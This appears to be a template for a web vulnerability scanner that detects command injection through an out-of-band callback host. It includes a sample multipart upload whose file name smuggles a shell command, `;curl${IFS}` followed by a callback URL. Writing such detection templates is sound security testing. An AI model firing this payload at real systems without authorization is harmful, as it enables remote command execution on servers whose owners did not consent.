title: command_injection.oast
description: Command injection proven out-of-band: the injected command reaches an OAST host the engine controls.
x-notes: Token mode (preferred for shell breakouts): set mutation_slots.oast_host to the literal token "{{oast_url}}" or "{{oast_host}}" and place that token anywhere in request.url / body / header values — inside a shell breakout, a multipart filename, a query param, or a JSON value. The engine substitutes {{oast_url}} with its full callback URL (use with curl/wget) and {{oast_host}} with the bare OAST host (use with nslookup/ping), leaving your surrounding payload (e.g. `;curl${IFS}{{oast_url}};`) intact.

Legacy field mode: set mutation_slots.oast_host to a form field name (or "body.<field>") and the engine overwrites that URL-encoded form field with the bare OAST host. Only works when the sink already runs a network command on the raw field (e.g. `nslookup <field>`); it cannot express a breakout.
Source attribution is required — a callback not from the target infra does not count.

mutation_slots.description: Must contain oast_host -> either the literal token "{{oast_url}}"/"{{oast_host}}" you placed in the request (token mode), or a form field name the bare host overwrites (legacy mode).

poll_window_seconds.description: max seconds to wait for the callback (async sinks need longer); default 120

request.body:
--X
Content-Disposition: form-data; name="file"; filename="a;curl${IFS}{{oast_url}};b.png"
Content-Type: image/png

PNGDATA
--X--
